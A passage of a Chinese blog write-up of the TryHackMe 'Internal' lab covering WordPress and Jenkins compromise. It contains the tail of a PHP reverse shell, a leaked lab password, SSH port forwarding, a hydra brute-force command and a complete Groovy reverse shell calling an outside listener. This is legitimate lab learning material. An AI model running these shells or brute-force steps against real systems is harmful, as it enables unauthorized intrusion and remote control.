                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// If we can read from the process's STDERR</span>
        <span class="token comment">// send data down tcp connection</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Like print, but does nothing if we've daemonised ourself</span>
<span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
<span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240430091929444.png" alt="image-20240430091929444"></p>
<p>之后找到404.php文件所在路径，访问即可得到shell</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">wp-content/themes/twentyseventeen/404.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240430093533449.png" alt="image-20240430093533449"></p>
<p>这里就最头疼了，想着靠自己努力努力，当前是www-data权限，所以需要提权，我一直认为有什么漏洞可以提权，但搞了半天找不到，我以为是提权姿势可能很骚，想不到还是要回归原始：信息搜集</p>
<h2 id="密码泄露提权user">密码泄露提权user</h2>
<p>walkthrough这里就是信息搜集，找到了opt目录下的敏感文件，查看发现用户泄露的密码。拿直接su 用户名切换即可</p>
<p>（为何是opt啊。。。）</p>
<p><img src="image-20240430094356024.png" alt="image-20240430094356024"></p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">aubreanna</span><span class="token punctuation">:</span>bubb13guM!@#123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240430094503817.png" alt="image-20240430094503817"></p>
<p><img src="image-20240430094454352.png" alt="image-20240430094454352"></p>
<p>同时发现本目录下这个文件，写着此时还在内网运行一个服务器</p>
<p><img src="image-20240430095629882.png" alt="image-20240430095629882"></p>
<h2 id="ssh端口转发拿下内网主机">ssh端口转发拿下内网主机</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">curl -U <span class="token property">aubreanna</span><span class="token punctuation">:</span>bubb13guM!@#123 <span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//172.17.0.2:8080/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>由于我们不能访问其内网，因此需要ssh端口转发一下</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">ssh -f -N -L <span class="token property">4567</span><span class="token punctuation">:</span>172.17.0.<span class="token property">2</span><span class="token punctuation">:</span>8080 aubreanna@internal.thm
#根据前述结果，登录密码为：bubb13guM!@#123
#ssh端口转发<span class="token punctuation">(</span>本地网卡地址0.0.0.0可省略<span class="token punctuation">)</span>：HostB$ ssh -L 0.0.0.<span class="token property">0</span><span class="token punctuation">:</span><span class="token property">PortB</span><span class="token punctuation">:</span><span class="token property">HostC</span><span class="token punctuation">:</span>PortC user@HostC
#参数说明
#-C：压缩数据
#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。
#-N ：不执行脚本或命令，通常与-f连用。
#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。
#<span class="token property">-L</span> <span class="token punctuation">:</span> 本地隧道，本地端口<span class="token punctuation">:</span>目标<span class="token property">IP</span><span class="token punctuation">:</span>目标端口
#<span class="token property">-D</span> <span class="token punctuation">:</span> 动态端口转发
#<span class="token property">-R</span> <span class="token punctuation">:</span> 远程隧道
#-T ：不分配 TTY 只做代理用
#-q ：安静模式，不输出 错误/警告 信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="image-20240430095943633-1714442383961-1.png" alt="image-20240430095943633"></p>
<p>发现Jenkins组件，尝试爆破账户密码，猜测用户名就是admin</p>
<h2 id="hydra暴力破解-2">hydra暴力破解</h2>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4567 127.0.0.1 http-post-form <span class="token string">"/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="image-20240430101130883.png" alt="image-20240430101130883"></p>
<p>成功得到密码，接下来就是执行bash，不过尝试了很多，结果还是walkthrough有效？下去看看为何</p>
<p>好的，这是因为这个脚本控制台就提示了我们只能使用groovy script</p>
<p><img src="image-20240430114039571.png" alt="image-20240430114039571"></p>
<p>发现google搜索即可得到</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">String host=<span class="token string">"10.14.79.125"</span><span class="token punctuation">;</span>
int port=6666<span class="token punctuation">;</span>
String cmd=<span class="token string">"/bin/bash"</span><span class="token punctuation">;</span>
Process p=new <span class="token function">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>.<span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>.<span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Socket s=new <span class="token function">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>InputStream pi=p.<span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pe=p.<span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> si=s.<span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OutputStream po=p.<span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so=s.<span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">while</span><span class="token punctuation">(</span>!s.<span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">while</span><span class="token punctuation">(</span>pi.<span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&gt;0<span class="token punctuation">)</span>so.<span class="token function">write</span><span class="token punctuation">(</span>pi.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">while</span><span class="token punctuation">(</span>pe.<span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&gt;0<span class="token punctuation">)</span>so.<span class="token function">write</span><span class="token punctuation">(</span>pe.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">while</span><span class="token punctuation">(</span>si.<span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span>&gt;0<span class="token punctuation">)</span>po.<span class="token function">write</span><span class="token punctuation">(</span>si.<span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>so.<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>po.<span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Thread.<span class="token function">sleep</span><span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">;</span>try <span class="token punctuation">{</span>p.<span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>break<span class="token punctuation">;</span><span class="token punctuation">}</span>catch <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>p.<span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s.<span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>找到下面位置，执行shell即可</p>
<p><img src="image-20240430102107036.png" alt="image-20240430102107036"></p>
<h2 id="密码泄露提权root">密码泄露提权root</h2>
<p>拿到shell，依旧信息搜集，发现root用户密码，su切换即可</p>
<p><img src="image-20240430102645299.png" alt="image-20240430102645299"></p>
<p>拿到flag</p>
<p><img src="image-20240430102710588.png" alt="image-20240430102710588"></p>
<h2 id="总结-12">总结</h2>
<p>又给我整emo了，什么时候才能凭借自己做出一个。。。</p>
<p>首先常规扫描，只发现了22、80端口，那毫无疑问扫web站点，同时访问80看看页面是否有什么信息泄露，发现是一个wp站点 ，同时泄露了版本：5.4.2，但似乎没有什么利用思路。接着就是wpscan工具的利用了，利用它可以扫wp版本、可能的用户名、爆破密码、插件漏洞、使用的主题等等。</p>
<p>这里本是可以扫出主题信息的，但我不知道为何扫不出来，随后就是根据wp目录结构，找到登陆页面，利用wpscan暴力破解密码，之后进入后台编辑PHP文件，拿到shell，发现自己是最普通用户，本以为是利用配置漏洞来提权啥的，但还是需要回归本质，做一手信息搜集，这里walkthrough是搜集到了opt目录下存在用户密码泄露，接着su就可以切换用户，但还不是 root，之后发现其内网网段还存在一个web服务，但我们在外网，需要端口转发（在回顾一手ssh端口转发），接着本地可以访问其内网了，然后发现是jenkins组件，hydra暴力破解进入后台，执行shell，监听拿到shell，发现该主机下也有密码泄露，得到root密码。成功提权</p>
<p>总的来说，还是需要有思路和技术的经验积累，虽然我扫出了相关信息，但还是无从下手，之后在回顾一下之前的旅程，看接下来的靶机是否会更进一步吧。</p>
<p>顺便说一下刚开始为何IP访问会出现页面渲染不全的问题，但用域名访问就会正常：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">当只使用IP地址访问网站而无法正常渲染的原因可能有以下几点：

1. 虚拟主机配置：许多网站使用虚拟主机技术，在同一台服务器上托管多个网站。当通过域名访问网站时，Web服务器可以根据请求的域名将请求路由到正确的虚拟主机，从而提供正确的网站内容。但是，当您只使用IP地址访问网站时，服务器无法确定您要访问哪个虚拟主机，可能会返回默认的或错误的内容。

2. 域名绑定和重定向：有些网站可能使用域名绑定或重定向来将特定的域名映射到对应的网站目录或URL。当您只使用IP地址访问网站时，缺少了域名信息，可能无法触发正确的域名绑定或重定向操作，导致渲染不全或显示错误的内容。

3. 基于域名的资源加载：网站中的一些资源（例如样式表、JavaScript文件、图像等）可能使用相对路径或基于域名的绝对路径进行引用。当只使用IP地址访问网站时，浏览器无法确定正确的域名，因此无法加载这些资源，导致网站渲染不全或缺少样式和图像等元素。

使用域名访问网站可以解决上述问题，因为域名提供了更多的信息和上下文，使得服务器能够正确地处理请求并提供正确的内容。如果只能使用IP地址访问网站，并且遇到了渲染不全的问题，建议使用域名访问，或者联系网站管理员以获取更多支持和解决方案。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="参考文章-4">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17149180.html">【THM】Internal-练习</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/118548932">wpscan使用教程</a></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://hybcx.xyz/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/">http://hybcx.xyz/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">hybcx</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/tryhackme/">
                                    <span class="chip bg-color">tryhackme</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">随缘，看各位佬的心情</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="i春秋CTF刷题">
                        
                        <span class="card-title">i春秋CTF刷题</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-29
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/03/27/nustctf/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="NUSTCTF">
                        
                        <span class="card-title">NUSTCTF</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                    CTF赛事
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                        <span class="chip bg-color">CTF赛事</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.js"></script>


<!-- 代码语言 -->


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('3'),
            headingSelector: 'h2, h3, h4, h5, h6'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">861.1k</span>
            
            
            
            
